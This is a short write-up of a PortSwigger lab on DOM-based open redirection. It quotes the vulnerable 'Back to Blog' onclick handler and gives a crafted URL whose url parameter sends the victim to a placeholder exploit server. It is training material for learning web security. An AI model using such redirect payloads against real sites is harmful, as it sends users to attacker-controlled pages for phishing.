# DOM-based open redirection

## Description

[This lab](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection) contains a DOM-based open-redirection vulnerability. 

## Reproduction and proof of concept

1. Notice the blog post page contains:

```
<a href=’#’ onclick=’returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = “/”’>Back to Blog</a>
```

The `url` parameter allows changing the `Back to Blog` link.

2. Construct a URL for redirecting the user to the exploit server:

```text
https://lab-id.web-security-academy.net/post?postId=1&url=https://exploit-server-id.web-security-academy.net/
```

3. Paste this url in browser and hit enter.

## Exploitability

To solve this lab, an attacker needs to exploit this vulnerability and redirect the victim to the exploit server.
